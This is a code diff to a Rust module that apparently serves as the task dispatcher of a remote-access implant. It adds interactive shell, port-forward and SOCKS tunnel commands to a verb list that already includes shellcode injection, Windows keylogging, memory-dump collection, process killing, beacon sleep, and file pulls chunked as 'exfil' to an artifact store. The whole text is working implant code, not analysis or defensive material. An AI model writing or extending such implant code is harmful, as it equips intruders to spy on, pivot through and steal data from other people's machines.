@@ -16,15 +16,21 @@ pub type Cadence = Arc<Mutex<(f64, f64)>>;
 
 /// Every verb this binary compiled, in advertised order. The handshake
 /// advertises the baked class verbs intersected with this set. The sets are
-/// cfg'd whole: attributes do not apply to array elements.
+/// cfg'd whole: attributes do not apply to array elements. The channel verbs
+/// (shell.interact, tunnel.forward, tunnel.socks) are compiled on every
+/// platform -- their machinery lives in the channel layer, not the handler
+/// table, and dispatch routes them there.
 #[cfg(windows)]
 pub const COMPILED_VERBS: &[&str] = &[
     "shell.exec",
+    "shell.interact",
     "file.pull",
     "file.push",
     "fs.list",
     "beacon.sleep",
     "proc.kill",
+    "tunnel.forward",
+    "tunnel.socks",
     "inject.shellcode",
     "collect.minidump",
     "collect.keylog",
@@ -33,11 +39,14 @@ pub const COMPILED_VERBS: &[&str] = &[
 #[cfg(not(windows))]
 pub const COMPILED_VERBS: &[&str] = &[
     "shell.exec",
+    "shell.interact",
     "file.pull",
     "file.push",
     "fs.list",
     "beacon.sleep",
     "proc.kill",
+    "tunnel.forward",
+    "tunnel.socks",
 ];
 
 /// One chunk per 512 KiB: comfortably under the frame-layer sizing budget
@@ -66,13 +75,25 @@ pub enum Outcome {
 
 impl HandlerOutput {
     fn ok(output: String) -> HandlerOutput {
-        HandlerOutput { outcome: Outcome::Succeeded, output, chunks: Vec::new() }
+        HandlerOutput {
+            outcome: Outcome::Succeeded,
+            output,
+            chunks: Vec::new(),
+        }
     }
     fn ok_with_chunks(output: String, chunks: Vec<ExfilChunk>) -> HandlerOutput {
-        HandlerOutput { outcome: Outcome::Succeeded, output, chunks }
+        HandlerOutput {
+            outcome: Outcome::Succeeded,
+            output,
+            chunks,
+        }
     }
     fn fail(output: String) -> HandlerOutput {
-        HandlerOutput { outcome: Outcome::Failed, output, chunks: Vec::new() }
+        HandlerOutput {
+            outcome: Outcome::Failed,
+            output,
+            chunks: Vec::new(),
+        }
     }
 }
 
@@ -98,7 +119,9 @@ pub fn dispatch(verb: &str, arguments: &str, cadence: &Cadence) -> HandlerOutput
         "collect.minidump" => crate::sensitive::collect_minidump(arguments),
         #[cfg(windows)]
         "collect.keylog" => crate::sensitive::collect_keylog(arguments),
-        _ => HandlerOutput::fail(format!("{verb}: this build carries no handler for the verb")),
+        _ => HandlerOutput::fail(format!(
+            "{verb}: this build carries no handler for the verb"
+        )),
     }
 }
 
@@ -166,12 +189,17 @@ fn file_pull(arguments: &str) -> HandlerOutput {
             name: name.clone(),
             content_type: "application/octet-stream".into(),
             sequence: index as u64,
-            terminal: index == (data.len() + CHUNK_BYTES - 1) / CHUNK_BYTES - 1,
+            terminal: index == data.len().div_ceil(CHUNK_BYTES) - 1,
             data: part.to_vec(),
         });
     }
     HandlerOutput::ok_with_chunks(
-        format!("{}: {} bytes, {} chunks streamed to artifact store", path, data.len(), chunks.len()),
+        format!(
+            "{}: {} bytes, {} chunks streamed to artifact store",
+            path,
+            data.len(),
+            chunks.len()
+        ),
         chunks,
     )
 }
@@ -208,7 +236,11 @@ fn file_push(arguments: &str) -> HandlerOutput {
 }
 
 fn fs_list(arguments: &str) -> HandlerOutput {
-    let path = if arguments.trim().is_empty() { "." } else { arguments.trim() };
+    let path = if arguments.trim().is_empty() {
+        "."
+    } else {
+        arguments.trim()
+    };
     let entries = match std::fs::read_dir(path) {
         Ok(entries) => entries,
         Err(err) => return HandlerOutput::fail(format!("list {path}: {err}")),
@@ -279,7 +311,9 @@ fn unix_proc_kill(arguments: &str) -> HandlerOutput {
             return HandlerOutput::fail(format!("proc.kill: kill({pid}, KILL): errno {}", errno()));
         }
     }
-    HandlerOutput::ok(format!("pid {pid} killed (escalated past the grace window)"))
+    HandlerOutput::ok(format!(
+        "pid {pid} killed (escalated past the grace window)"
+    ))
 }
 
 #[cfg(not(windows))]
